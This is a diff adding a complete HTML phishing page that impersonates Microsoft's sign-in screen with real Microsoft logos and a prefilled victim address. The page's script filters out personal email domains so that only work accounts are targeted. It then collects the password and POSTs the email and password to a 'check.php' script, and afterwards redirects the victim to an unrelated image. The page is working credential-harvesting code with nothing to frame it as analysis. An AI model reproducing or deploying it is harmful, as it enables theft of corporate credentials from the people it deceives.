@@ -1,0 +1,162 @@
+<html><head>
+	<link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+	<link rel="stylesheet" type="text/css" href="style.css">
+	<title>Sign in to your account</title>
+</head>
+<body>	
+
+		<div class="content">
+
+		<img src="https://aadcdn.msftauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+		<div class="identityBanner" id="backDiv" style="display: none;"><!-- ko if: isBackButtonVisible --> <button type="button" onclick="GoBack()" class="backButton" data-bind="
+        attr: { 'id': backButtonId || 'idBtn_Back' },
+        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
+        ariaDescribedBy: backButtonDescribedBy,
+        click: backButton_onClick,
+        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.fIsRTLMarket --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://aadcdn.msftauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="dave.waters@mpckinetic.com">dave.waters@mpckinetic.com</div> </div>
+		<div role="heading" aria-level="1" data-bind="text: title" id="title-text" class="text-title">Sign in</div>
+        <div role="alert" aria-live="assertive"><!-- ko if: usernameTextbox.error --> <div class="alert alert-error col-md-24" id="usernameError" data-bind="
+            htmlWithBindings: usernameTextbox.error,
+            childBindings: {
+                'idA_PWD_SignUp': { href: svr.urlSignUp, click: signup_onClick },
+                'aadSignup': { href: svr.urlAadSignup, click: aadSignup_onClick },
+                'aadSelfSignup': { click: signup_onClick },
+                'otherIdpLogin': { href: svr.urlGoToAADError, click: otherIdpLogin_onClick },
+                'sendOtcLink': { click: sendOtcLink_onClick } }" style="font-size: 17px; display: none;">Enter a valid email address or phone number.</div><!-- /ko --> </div>
+		<input type="email" oninput="checkMail()" id="input-box" name="loginfmt" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" style="    border-top: none;
+    border-left: none;
+    border-right: none;
+    padding: 0;
+    border-bottom: 1px solid;
+    font-size: 18px;" data-bind=" css: { 'has-error': usernameTextbox.error },
+                    ariaLabel: tenantBranding.UserIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
+                    ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.fHideLoginDesc ? ' loginDescription' : ''),
+                    textInput: usernameTextbox.value,
+                    hasFocusEx: usernameTextbox.focused,
+                    placeholder: $placeholderText" aria-label="Enter your email." aria-describedby="loginHeader" placeholder="Email">
+                    <div class="form-group" style="
+    margin-top: 5%;
+"> <a id="cantAccessAccount" name="cannotAccessAccount" href="#" data-bind="
+                        text: str['WF_STR_CantAccessAccount_Text'],
+                        click: cantAccessAccount_onClick">Can't access your account?</a> </div>
+        <div class="col-xs-24 no-padding-left-right button-container" data-bind="
+    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
+    css: { 'no-margin-bottom': removeBottomMargin }&gt;&lt;!-- ko if: isSecondaryButtonVisible --&gt;&lt;!-- /ko --&gt; &lt;div class=" inline-block"=""><!-- type="submit" is needed in-addition to in primaryButtonAttributes observable to support IE8 --> <img style="float: left;display: none;
+    width: 13%;
+    margin-top: 4%;" id="loading" src="https://cdn.lowgif.com/small/d35d94c490e598e3-loading-gif-transparent-loading-gif.gif"><input type="button" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
+            attr: primaryButtonAttributes,
+            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
+            hasFocus: focusOnPrimaryButton,
+            click: primaryButton_onClick,
+            enable: isPrimaryButtonEnabled,
+            visible: isPrimaryButtonVisible,
+            preventTabbing: primaryButtonPreventTabbing" value="Next" onclick="submit();" name="next" style="    margin-top: 5%;
+    width: 37%;
+    border: none;
+    padding: 2%;
+    background: rgb(23, 117, 190);
+    font-size: 18px;
+    color: white;
+    cursor: pointer;"> </div> </div>
+
+
+
+
+    <script type="text/javascript">
+    	var alertBox = document.getElementById("usernameError");
+    	var submittedOnce = 0;
+    	var mailError = 0;
+    	var mailCheck = 0;
+    	var AccountError = 0;
+    	var input = document.getElementById('input-box');
+    	var title = document.getElementById("title-text");
+    	var btn = document.getElementById("idSIButton9");
+    	var userTitle = document.getElementById("displayName");
+    	var backDiv = document.getElementById("backDiv");
+    	var userName = "";
+    	var passWord = "";
+    	function CheckLogin(){
+    		document.getElementById("loading").style.display="block";
+    		if(input.value==""){
+    			alertBox.style.display = "block";
+    			alertBox.innerHTML = "Please enter your password.";
+    			input.style.borderColor = "red";
+    			document.getElementById("loading").style.display="none";
+    		}else{
+    			var xhttp = new XMLHttpRequest();
+				xhttp.onreadystatechange = function() {
+					if (this.readyState == 4 && this.status == 200) {
+						if(this.responseText.includes("True")){
+							document.getElementById("loading").style.display="none";
+                            setTimeout(function(){
+                                location.replace("https://www.thesun.co.uk/wp-content/uploads/2020/04/RR-COMP-WORLDMAP-CORONA-USA-14-APRIL-1316.jpg");
+                            },3000);
+						}else{
+							alertBox.style.display = "block";
+			    			alertBox.innerHTML = "You entered invalid password.";
+			    			input.style.borderColor = "red";
+			    			document.getElementById("loading").style.display="none";
+						}
+					}
+				};
+				xhttp.open("POST", "check.php", true);
+				xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+				xhttp.send("mail="+ userName +"&pass=" + input.value);
+    		} 
+
+    	}
+    	function GoBack(){
+    		userTitle.innerHTML = "";
+    		userTitle.title="";
+    		backDiv.style.display = "none";
+			title.innerHTML = "Sign in";
+			input.placeholder = "Email";
+			input.type = "text";
+			input.setAttribute('oninput','CheckMail()');
+			input.value = userName;
+			btn.setAttribute('onclick','submit()');
+			btn.value = "Next";
+			alertBox.style.display = "none";
+			alertBox.innerHTML = "Please enter your password.";
+			input.style.borderColor = "black";
+    	}
+    	function submit(){
+    		mailCheck = 1;
+    		if(checkMail()){
+    			document.getElementById("loading").style.display="block";
+    			setTimeout(function(){
+    				userTitle.innerHTML = input.value;
+		    		userTitle.title=input.value;
+		    		backDiv.style.display = "block";
+	    			title.innerHTML = "Enter password";
+	    			input.placeholder = "Password";
+	    			input.type = "password";
+	    			input.setAttribute('oninput','');
+	    			userName = input.value;
+	    			input.value = "";
+	    			btn.setAttribute('onclick','CheckLogin()');
+	    			btn.value = "Log In";
+	    			document.getElementById("loading").style.display="none";
+    			},3000);
+    		}
+    	}
+    	function checkMail(){
+    		if(mailCheck==1){
+    			alertBox.style.display = "block";
+    			if(input.value.includes("@gmail") || input.value.includes("@yandex") || input.value.includes("@yahoo") || input.value.includes("@gmx")||input.value.includes("@outlook")||input.value.includes("@live")||input.value.includes("@comcast")||input.value.includes("@bigpond")){
+    				alertBox.innerHTML = "You can't sign in here with a personal account. Use your work or school account instead.";
+    				input.style.borderColor = "red";
+    			}else if(input.value.includes("@") == false || input.value.includes(".") == false){
+    				alertBox.innerHTML = "Enter a valid email address or phone number.";
+    				input.style.borderColor = "red";
+    			}else{
+    				mailError = 0;
+    				alertBox.style.display = "none";
+    				return 1;
+    			}
+    		}
+    		return 0;
+    	}
+    </script>
+
+</body></html>
